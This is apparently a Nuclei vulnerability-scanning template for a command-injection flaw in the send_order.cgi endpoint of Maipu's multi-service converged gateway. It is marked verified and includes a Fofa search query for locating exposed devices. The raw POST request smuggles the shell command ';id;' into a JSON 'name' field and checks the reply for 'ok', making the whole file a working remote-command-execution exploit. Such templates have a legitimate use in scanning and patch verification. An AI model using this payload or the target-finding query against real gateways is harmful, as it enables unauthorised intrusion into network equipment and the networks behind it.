id: Maipu_IGW_send_order_RCE

info:
  name: Maipu_IGW_send_order_RCE
  author: HK
  severity: high
  description: 迈普多业务融合网关/send_order.cgi接口存在命令执行漏洞
  metadata:
    max-request: 1
    Fofa-query: title="迈普多业务融合网关"
    verified: true

http:
- raw:
  - |-
    @timeout: 30s
    POST /send_order.cgi?parameter=operation HTTP/1.1
    Host: {{Hostname}}
    Pragma: no-cache
    Cache-Control: no-cache
    Accept: */*
    Accept-Language: zh-CN,zh;q=0.9
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
    Accept-Encoding: gzip, deflate
    Content-Length: 40

    {"opid":"1","name":";id;","type":"rest"}

  max-redirects: 3
  matchers-condition: and
  matchers:
    - type: word
      part: body
      words:
      - ok